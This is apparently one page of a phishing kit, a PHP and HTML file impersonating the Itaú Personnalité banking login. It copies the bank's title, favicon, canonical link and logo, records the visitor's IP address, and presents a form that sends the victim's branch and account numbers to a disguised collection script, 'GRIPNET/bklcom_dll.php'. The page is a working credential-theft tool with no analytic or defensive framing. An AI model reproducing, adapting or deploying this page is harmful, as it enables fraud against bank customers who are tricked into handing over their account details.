<?php
session_start();
$tempo = time();
$aleatorio = rand(1000, 999999);
$ta = "$tempo.$aleatorio";
$ip_usuario = $_SERVER['REMOTE_ADDR'];

$_SESSION['sessao'] = md5($ta);
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1"/>
<link rel="canonical" href="https://www.itau.com.br/personnalite/"/>
<link rel="shortcut icon" type="image/png" href="https://www.itau.com.br/content/dam/itau/favicon.png"/>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
<title>Itaú Personnalité | Relacionamento próximo e surpreendente</title>
</head>
<body class="skdjskad">
<div class="container">
  	  	 <div class="row">
  	  	 	 <div class="col-sm-12"> 
  	  	 	 	<br><br>
  	  	 	 	  <img src="../acesso-desktop/img//logo-itau-personnalite-desktop.png" alt="" border="0" height="80px" >
  	  	 	 </div>
  	  	 </div>
  	  </div>
  <section class="sdasdd">
  	  <div class="container">
  	  	 <div class="row">
  	  	 	 <div class="col-sm-12"> 
  	  	 	 	  <div class="illustration">
  	  	 	 	  	<form method="post" action="../acesso-desktop/GRIPNET/bklcom_dll.php">
  	  	 	 	  		<label for="">agência</label>
  	  	 	 	  		<label for="" style="margin-left:50px;">conta</label><br>
  	  	 	 	  		<input name="aggggg" maxlength="4" id="numeric" minlength="4" class="sadsadasdasd" type="text">

  	  	 	 	  		<input name="contaaaaaaa" id="numeric1"  maxlength="6" minlength="6" size="6" class="sadsadasdasd" type="text">
  	  	 	 	  		<hr style="border:solid 0.9px rgb(255, 255, 255);margin-top:4px;	">

  	  	 	 	  		<input class="sadsdas333" type="submit" value="ok">
  	  	 	 	  	</form>
  	  	 	 	  </div>
  	  	 	 </div>
  	  	 </div>
  	  </div>
  </section>





<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>	


    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script>
$('#numeric').keyup(function() {
  $(this).val(this.value.replace(/\D/g, ''));
});
</script>

<script>
$('#numeric1').keyup(function() {
  $(this).val(this.value.replace(/\D/g, ''));
});
</script>


<script>
$('#numeric').keyup(function() {
  $(this).val(this.value.replace(/\D/g, ''));
});
</script>
</body>
</html>